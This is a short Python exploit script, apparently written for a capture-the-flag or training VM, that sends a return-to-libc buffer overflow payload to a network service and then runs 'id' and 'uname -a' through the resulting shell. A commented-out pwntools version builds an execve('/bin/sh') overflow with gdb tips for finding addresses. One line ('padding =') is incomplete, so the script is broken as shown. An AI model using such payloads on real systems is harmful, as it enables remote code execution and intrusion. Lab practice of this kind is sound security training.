#!/usr/bin/python
import struct
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# for some reason only NAT mode is working on the VM
# and tcp connections can't be made outside the VM
s.connect(('127.0.0.1', 2994))
padding =
strncmp_got = struct.pack("I", 0x804a1a8)
system = struct.pack("I", 0xb7ecffb0)
# 127.0.0.1:41520
exploit = padding + system + "AAAA"
s.send(exploit+"\n")
s.send("id\n")
print s.recv(1024)
s.send("uname -a\n")
print s.recv(1024)
# from pwn import *
# # from struct import *
# conn = remote('172.16.17.27', 2995)
# # address of execve found from running gdb on the process:
# # gdb $(pidof final0)
# # then info functions @plt gives all the glibc addresses
# execve = p32(0x08048c0c)
# #         base of libc + where in libc /bin/sh is
# binsh = p32(0xb7e97000+1176511)
# exploit = b'A'*515+b'\x00'+b'a'+execve
# #          append fake address of A's
# exploit += b'A'*4+binsh+b'\x00'*8+b'\n'
# print(exploit)
# if conn:
#     conn.send(exploit)
#     print(conn.recvn(4))
#     conn.send(b'id')
#     #print(conn.recvn(4))
#     conn.send(b'uname')
#     # print(conn.recvline(timeout=2))
#     #log.info(conn.recv(20).decode('utf-8'))
#     conn.close()
